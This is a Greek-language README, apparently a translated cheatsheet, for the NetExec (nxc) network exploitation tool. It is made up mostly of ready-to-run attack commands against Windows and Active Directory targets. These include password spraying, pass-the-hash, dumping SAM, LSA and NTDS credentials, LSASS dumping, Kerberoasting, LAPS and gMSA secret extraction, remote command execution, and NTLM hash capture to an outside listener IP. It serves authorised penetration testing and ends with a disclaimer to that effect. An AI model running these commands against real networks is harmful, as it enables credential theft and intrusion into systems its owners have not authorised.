<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⚡ NetExec (nxc) - Ολοκληρωμένο Cheatsheet

[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
```
  ███╗   ██╗███████╗████████╗███████╗██╗  ██╗███████╗ ██████╗ 
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝╚██╗██╔╝██╔════╝██╔════╝ 
  ██╔██╗ ██║█████╗     ██║   █████╗   ╚███╔╝ █████╗  ██║     
  ██║╚██╗██║██╔══╝     ██║   ██╔══╝   ██╔██╗ ██╔══╝  ██║     
  ██║ ╚████║███████╗   ██║   ███████╗██╔╝ ██╗███████╗╚██████╗ 
  ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ 
        The Network Swiss Army Knife (CrackMapExec Successor)
```
<p align="center">
  <img src="https://img.shields.io/badge/NetExec-nxc-blue?style=for-the-badge" alt="NetExec">
  <img src="https://img.shields.io/badge/CME_Successor-Active_Development-green?style=for-the-badge" alt="CME Successor">
  <img src="https://img.shields.io/badge/Multi_Protocol-SMB_LDAP_MSSQL-orange?style=for-the-badge" alt="Multi-Protocol">
  <img src="https://img.shields.io/badge/Network-Pentesting-red?style=for-the-badge" alt="Δοκιμή Δικτύου">
</p>

<p align="center">
  <b>🌐 Ο επίσημος διάδοχος του CrackMapExec με γνώμονα την κοινότητα για εκμετάλλευση δικτύου και Active Directory</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Εισαγωγή](#-εισαγωγή)
- [Γιατί το NetExec έναντι του CrackMapExec;](#-why-netexec-over-crackmapexec)
- [Εγκατάσταση] (#-εγκατάσταση)
- [Υποστηριζόμενα πρωτόκολλα](#-supported-protocols)
- [SMB Exploitation](#-smb-exploitation)
  - [Reconnaissance & Share Enumeration](#reconnaissance--share-enumeration)
  - [Password Spraying & Credential Testing](#password-spraying--credential-testing)
  - [Pass-the-Hash (PtH) & Pass-the-Ticket (PtT)](#pass-the-hash-pth--pass-the-ticket-ptt)
  - [Credential Dumping (SAM, LSA, NTDS)](#credential-dumping-sam-lsa-ntds)
  - [Εκτέλεση εντολής](#command-execution)
- [LDAP Exploitation](#-ldap-exploitation)
  - [Πολιτική απαρίθμησης τομέα και κωδικού πρόσβασης](#domain-enumeration--password-policy)
  - [AS-REP Roasting & Kerberoasting](#as-rep-roasting--kerberoasting)
  - [LAPS & gMSA Extraction](#laps--gmsa-extraction)
  - [Κατάληψη δεδομένων BloodHound](#bloodhound-data-ingestion)
- [MSSQL Exploitation](#-mssql-exploitation)
- [Ενότητες WinRM, RDP & SSH](#-winrm-rdp--ssh-modules)
- [Δημοφιλείς μονάδες NetExec (`-M`)](#-popular-netexec-modules--m)
- [Workspaces & Built-in Database](#-workspaces--built-in-database)
- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
- [Συμβουλές και βέλτιστες πρακτικές] (#-συμβουλές--βέλτιστες πρακτικές)
- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)
- [Πόροι](#-πόροι)

---

## 🎯 Εισαγωγή

Το **NetExec** (`nxc`) είναι ένα εργαλείο πολλαπλών χρήσεων μετά την εκμετάλλευση που έχει σχεδιαστεί για να αυτοματοποιεί την αξιολόγηση μεγάλων δικτύων Active Directory και Windows. Είναι το επίσημο, ενεργό πιρούνι κοινότητας και η συνέχεια του **CrackMapExec** (CME), που δημιουργήθηκε μετά την απόσυρση του CME και αρχειοθέτηση από τον αρχικό του συγγραφέα.

Το NetExec λειτουργεί ως "ελβετικό μαχαίρι στρατού" του δικτύου, που διασυνδέεται απρόσκοπτα με SMB, LDAP, MSSQL, WinRM, RDP, SSH, FTP και VNC για αυτοματοποίηση ελέγχου ταυτότητας, απόρριψη διαπιστευτηρίων, ελέγχους ευπάθειας και πλευρική κίνηση.

---

## ⚖️ Γιατί το NetExec έναντι του CrackMapExec;

| Χαρακτηριστικό | CrackMapExec (CME) | NetExec (nxc) |
|---------|--------------------|---------------|
| **Κατάσταση ανάπτυξης** | 🛑 Αρχειοθετήθηκε / Καταργήθηκε | Διατηρείται ενεργά |
| **Υποστήριξη Python** | Legacy (Python 3.8-3.10) | Σύγχρονη Python 3.10+ |
| **Υποστήριξη πρωτοκόλλου** | SMB, LDAP, MSSQL, WinRM, SSH | + Βελτιώσεις VNC, FTP, RDP, WMI |
| **Υποστήριξη BloodHound** | BloodHound Legacy μόνο | BloodHound CE & Legacy |
| **Κέρμπερος & ΠΚΙΝΙΤ** | Περιορισμένη | Στιβαρή υποστήριξη εισιτηρίων PKINIT & Kerberos |
| **Διορθώσεις σφαλμάτων και λειτουργικές μονάδες** | Κατεψυγμένα | Συνεχώς ενημερωμένες μονάδες CVE και exploit |

---

## 📥 Εγκατάσταση

### Χρήση pipx (Συνιστάται)
```bash
pipx install netexec
```
### Kali Linux

Το NetExec είναι η επίσημη αντικατάσταση του CrackMapExec στο Kali:
```bash
sudo apt update && sudo apt install -y netexec
```
### Docker
```bash
docker run -it --rm -v ~/.nxc:/root/.nxc ghcr.io/penny-os/netexec:latest smb 10.10.10.0/24
```
### Επαλήθευση
```bash
nxc --version
```
---

## 🔌 Υποστηριζόμενα πρωτόκολλα

Το NetExec αποδέχεται το πρωτόκολλο προορισμού ως κύριο όρισμα:
```bash
nxc <protocol> <target(s)> [options]
```
- `nxc smb` - Μπλοκ μηνυμάτων διακομιστή (κοινοποιήσεις, απόρριψη SAM/LSA/NTDS, εκτέλεση εντολών)
- `nxc ldap` - Ελαφρύ πρωτόκολλο πρόσβασης καταλόγου (Kerberoasting, BloodHound, LAPS)
- `nxc mssql` - Microsoft SQL Server (ερωτήματα βάσης δεδομένων, xp_cmdshell, πλαστοπροσωπία)
- `nxc winrm` - Απομακρυσμένη διαχείριση των Windows (κλεφτή εκτέλεση εντολών)
- `nxc rdp` - Πρωτόκολλο απομακρυσμένης επιφάνειας εργασίας (επαλήθευση ταυτότητας, στιγμιότυπα οθόνης)
- `nxc ssh` - Secure Shell (δοκιμή διαπιστευτηρίων Linux/UNIX & exec)
- `nxc ftp` / `nxc vnc` - Μεταφορά αρχείων & Υπολογισμός εικονικού δικτύου

---

## 🛡️ Εκμετάλλευση μικρομεσαίων επιχειρήσεων

### Αναγνώριση & Απαρίθμηση μεριδίων
```bash
# Discover live hosts and check SMB signing status
nxc smb 10.10.10.0/24

# Enumerate null/anonymous sessions
nxc smb 10.10.10.50 -u '' -p '' --shares
nxc smb 10.10.10.50 -u 'guest' -p '' --shares

# Enumerate readable shares with credentials
nxc smb 10.10.10.0/24 -u 'alice' -p 'Welcome2026!' --shares

# Spider shares for sensitive files (e.g., matching config, password, or bak)
nxc smb 10.10.10.50 -u 'alice' -p 'Welcome2026!' -M spider_plus
```
### Ψεκασμός κωδικού πρόσβασης και έλεγχος διαπιστευτηρίων
```bash
# Check domain password policy before spraying (Prevents account lockouts!)
nxc smb 10.10.10.1 -u 'alice' -p 'Welcome2026!' --pass-pol

# Password spray a single password against a list of users
nxc smb 10.10.10.1 -u users.txt -p 'SeasonYear2026!' --continue-on-success

# Credential stuffing with user:pass pairs
nxc smb 10.10.10.1 -u users.txt -p passwords.txt --no-bruteforce
```
### Pass-the-Hash (PtH) & Pass-the-Ticket (PtT)
```bash
# Authenticate using NTLM hash
nxc smb 10.10.10.0/24 -u 'Administrator' -H 'fc525c9680e4760a094da0c9ec5f0d94' --local-auth

# Authenticate using Kerberos ccache ticket
export KRB5CCNAME=/path/to/ticket.ccache
nxc smb dc01.corp.local -k --shares
```
### Ντάμπινγκ διαπιστευτηρίων (SAM, LSA, NTDS)
```bash
# Dump local SAM database (Requires administrative privileges)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --sam

# Dump LSA secrets (Service accounts, cleartext passwords)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --lsa

# Dump Active Directory NTDS.dit database via VSS on Domain Controller
nxc smb 10.10.10.1 -u 'Administrator' -p 'Password123' --ntds
```
### Εκτέλεση εντολών
```bash
# Execute command via WMI (default)
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami /all'

# Execute command via PowerShell
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -X 'Get-Process'

# Execute command via SMBexec or atexec
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' --exec-method smbexec -x 'ipconfig'
```
---

## 🌳 Εκμετάλλευση LDAP

### Πολιτική απαρίθμησης και κωδικού πρόσβασης τομέα
```bash
# Dump domain users
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --users

# Dump domain groups and memberships
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --groups

# Check for active domain computers
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --computers
```
### AS-REP Roasting & Kerberoasting
```bash
# Identify and dump AS-REP Roastable accounts (DONT_REQ_PREAUTH)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --asreproast asrep_hashes.txt

# Request Kerberos Service Tickets (Kerberoasting)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --kerberoasting kerberoast_hashes.txt
```
### LAPS & gMSA Extraction
```bash
# Extract Microsoft LAPS (Local Administrator Password Solution) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M laps

# Dump Group Managed Service Account (gMSA) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M gmsa
```
### Κατάποση δεδομένων BloodHound
```bash
# Collect BloodHound data natively over LDAP
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --bloodhound --collection All
```
---

## 🗄️ MSSQL Exploitation
```bash
# Test MSSQL authentication across network
nxc mssql 10.10.10.0/24 -u 'sa' -p 'DatabasePassword!'

# Check for privilege escalation via server links
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M enum_links

# Enable xp_cmdshell and execute operating system command
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -x 'whoami'

# Capture NetNTLMv2 hash by triggering xp_dirtree
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M capture-ntlm -o IP=192.168.1.100
```
---

## 🚀 Ενότητες WinRM, RDP & SSH

### Εκτέλεση εντολών WinRM
```bash
nxc winrm 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami'
```
### Στιγμιότυπα οθόνης RDP & έλεγχος ταυτότητας
```bash
# Check RDP credentials and capture login screenshot
nxc rdp 10.10.10.50 -u 'Administrator' -p 'Pass123' --screenshot
```
### SSH Spraying & Commands
```bash
nxc ssh 10.10.10.0/24 -u 'root' -p 'toor' -x 'id'
```
---

## 🧩 Δημοφιλείς μονάδες NetExec (`-M`)

| Ενότητα | Πρωτόκολλο | Περιγραφή | Παράδειγμα |
|--------|----------|-------------|---------|
| `spooler` | SMB | Ελέγξτε εάν εκτελείται η υπηρεσία Print Spooler (PrinterBug) | `nxc smb <IP> -M spooler` |
| `zerologon` | SMB | Ελέγξτε για ευπάθεια CVE-2020-1472 | `nxc smb <IP> -M zerologon` |
| `nopac` | SMB | Έλεγχος για CVE-2021-42278 / CVE-2021-42287 | `nxc smb <IP> -M nopac` |
| `petitpotam` | SMB | Ελέγξτε εάν ο οικοδεσπότης είναι ευάλωτος στον εξαναγκασμό PetitPotam | `nxc smb <IP> -M petitpotam` |
| `nanodump` | SMB | Απόρριψη μνήμης LSASS minidump κρυφά χρησιμοποιώντας nanodump | `nxc smb <IP> -u admin -p pass -M nanodump` |
| `webdav` | SMB | Ελέγξτε εάν η υπηρεσία WebClient είναι ενεργή για το ρελέ WebDAV | `nxc smb <IP> -M webdav` |
| `laps` | LDAP | Απόρριψη κωδικών πρόσβασης LAPS για σταθμούς εργασίας | `nxc ldap <IP> -u u -p p -M laps` |
| `gmsa` | LDAP | Εξαγωγή μυστικών λογαριασμού υπηρεσίας διαχείρισης ομάδας | `nxc ldap <IP> -u u -p p -M gmsa` |

---

## 💾 Χώροι εργασίας και ενσωματωμένη βάση δεδομένων

Το NetExec καταγράφει αυτόματα όλους τους κεντρικούς υπολογιστές που ανακαλύφθηκαν, τα έγκυρα διαπιστευτήρια και τους κατακερματισμένους κατακερματισμούς σε μια τοπική βάση δεδομένων SQLite (`~/.nxc/workspaces/`):
```bash
# View all stored credentials
nxc-database credentials

# View discovered hosts
nxc-database hosts

# Create and switch to a new client engagement workspace
nxc-database workspace create ClientAlpha
nxc-database workspace switch ClientAlpha
```
---

## 📊 Γρήγορος πίνακας αναφοράς

| Εργασία | Πρωτόκολλο | Εντολή |
|------|----------|---------|
| **Αριθμήστε Μερίδια** | SMB | `nxc smb <IP> -u '' -p '' --shares` |
| **Ελέγξτε την πολιτική κάρτας** | SMB | `nxc smb <DC> -u 'user' -p 'pass' --pass-pol` |
| **Σπρέι κωδικού** | SMB | `nxc smb <IP> -u users.txt -p 'Pass' --continue-on-success` |
| **Περάστε το Hash** | SMB | `nxc smb <IP> -u 'admin' -H <NT_HASH> --local-auth` |
| **Απόθεση SAM** | SMB | `nxc smb <IP> -u 'admin' -H <HASH> --sam` |
| **Απόθεση NTDS** | SMB | `nxc smb <DC> -u 'admin' -p 'pass' --ntds` |
| **AS-REP Roasting** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --asreproast hashes.txt` |
| **Kerberoasting** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --kerberoasting hashes.txt` |
| **BloodHound Dump** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --bloodhound --collection All` |
| **MSSQL xp_cmdshell**| MSSQL | `nxc mssql <IP> -u 'sa' -p 'pass' -x 'whoami'` |

---

## 💡 Συμβουλές και βέλτιστες πρακτικές

1. **Να ελέγχετε πάντα πρώτα την πολιτική κωδικού πρόσβασης:**
   Πριν ξεκινήσετε οποιοδήποτε σπρέι κωδικού πρόσβασης, εκτελείτε πάντα το `nxc smb <DC> -u <USER> -p <PASS> --pass-pol` για να επιθεωρήσετε το `Account Lockout Threshold`. Εάν έχει οριστεί σε 3 ή 5, ψεκάστε μόνο μία φορά κάθε 30+ λεπτά για να αποφύγετε το κλείδωμα των λογαριασμών τομέα.
2. **Χρησιμοποιήστε το `--local-auth` για σταθμούς εργασίας:**
   Κατά τη δοκιμή διαπιστευτηρίων τοπικού διαχειριστή σε σταθμούς εργασίας αντί για διαπιστευτήρια τομέα, να συμπεριλαμβάνετε πάντα τη σημαία `--local-auth`.
3. **Συγκεντρωτική ενσωμάτωση:**
   Το NetExec λειτουργεί απρόσκοπτα μέσω διακομιστή μεσολάβησης SOCKS (π.χ. `proxychains nxc smb ...`) ή μέσω διασυνδέσεων Ligolo-ng TUN με εγγενή ταχύτητα!

---

## ⚠️ Νομική αποποίηση ευθύνης

> **ΣΗΜΑΝΤΙΚΟ:** Το NetExec είναι ένα επιθετικό εργαλείο αξιολόγησης ασφάλειας. Πρέπει να χρησιμοποιείται αυστηρά σε δίκτυα υπολογιστών και υποδομή τομέα όπου έχετε αποκτήσει ρητή, τεκμηριωμένη εξουσιοδότηση.

---

## 📚 Πόροι

- [Επίσημο αποθετήριο GitHub NetExec](https://github.com/Pennyw0rth/NetExec)
- [Επίσημη τεκμηρίωση NetExec](https://www.netexec.wiki/)